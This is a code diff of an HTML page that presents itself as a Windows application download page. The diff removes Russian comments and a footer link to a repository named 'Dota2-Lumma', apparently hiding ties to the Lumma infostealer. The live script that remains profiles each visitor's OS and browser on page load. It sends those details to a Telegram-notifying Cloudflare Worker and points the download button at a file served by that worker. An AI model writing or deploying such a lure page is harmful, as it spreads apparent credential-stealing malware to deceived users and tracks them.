@@ -195,20 +195,6 @@
       background: #687161;
     }
 
-    .footer {
-      display: flex;
-      justify-content: flex-end;
-      padding: 20px 0 25px;
-      border-top: 1px solid #ffffff12;
-      color: #828a7e;
-      font-size: 11px;
-    }
-
-    .footer a {
-      color: inherit;
-      text-underline-offset: 3px;
-    }
-
     @media(max-width: 520px) {
       main { width: min(100% - 32px, 440px); }
       .top { height: 70px; }
@@ -216,7 +202,6 @@
       .download-panel { border-radius: 16px; }
       .meta { gap: 12px; flex-wrap: wrap; }
       .meta span + span::before { margin-right: 12px; }
-      .footer { justify-content: flex-start; }
     }
 
     @media(prefers-reduced-motion: reduce) {
@@ -246,7 +231,6 @@
           Get the latest version of the application for Windows.
         </p>
 
-        <!-- Ссылка будет автоматически обновлена скриптом -->
         <a class="download"
            href="#"
            id="downloadButton">
@@ -261,22 +245,14 @@
         </div>
       </div>
     </section>
-
-    <footer class="footer">
-      <a href="https://github.com/rewfdf/Dota2-Lumma/releases">
-        Release history
-      </a>
-    </footer>
   </main>
 
   <script>
     (() => {
       "use strict";
 
-      // URL вашего Cloudflare Worker
       const API = "https://telegramnotify.streamminer95.workers.dev";
 
-      // 🔍 Асинхронная функция для точного определения ОС, браузера и версий
       async function getDeviceInfo() {
         const ua = navigator.userAgent;
         let os = "Unknown OS";
@@ -284,12 +260,10 @@
         let browser = "Unknown Browser";
         let browserEmoji = "🌐";
 
-        // --- 1. Определение точной версии ОС ---
         if (ua.includes("Windows")) {
           osEmoji = "🪟";
-          os = "Windows 10/11"; // По умолчанию
+          os = "Windows 10/11"; 
           
-          // Пытаемся узнать точную версию через Client Hints (Chrome, Edge, Opera)
           if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
               const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
@@ -305,7 +279,6 @@
               console.warn("Client Hints недоступны.");
             }
           } else {
-            // Фоллбэк для Firefox и Safari
             if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
             else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
           }
@@ -315,7 +288,6 @@
         else if (ua.includes("iPhone") || ua.includes("iPad")) { os = "iOS"; osEmoji = "🍏"; }
         else if (ua.includes("Linux")) { os = "Linux"; osEmoji = "🐧"; }
 
-        // --- 2. Определение браузера ---
         if (ua.includes("Edg/")) { 
           browser = "Edge " + ua.split("Edg/")[1].split(".")[0]; 
           browserEmoji = "🌊"; 
@@ -337,12 +309,9 @@
         return `${osEmoji} Device: ${os} · ${browserEmoji} ${browser}`;
       }
 
-      // 🚀 Инициализация при загрузке страницы
       (async () => {
-        // 1. Получаем инфу об устройстве
         const deviceString = await getDeviceInfo();
 
-        // 2. Отправляем уведомление о посещении
         fetch(API + "/notify", {
           method: "POST",
           headers: { "Content-Type": "text/plain" },
@@ -353,7 +322,6 @@
           keepalive: true
         }).catch(() => {});
 
-        // 3. Подменяем ссылку у кнопки скачивания, добавляя инфу об устройстве
         const btn = document.getElementById("downloadButton");
         if (btn) {
           btn.href = API + "/download?device=" + encodeURIComponent(deviceString);
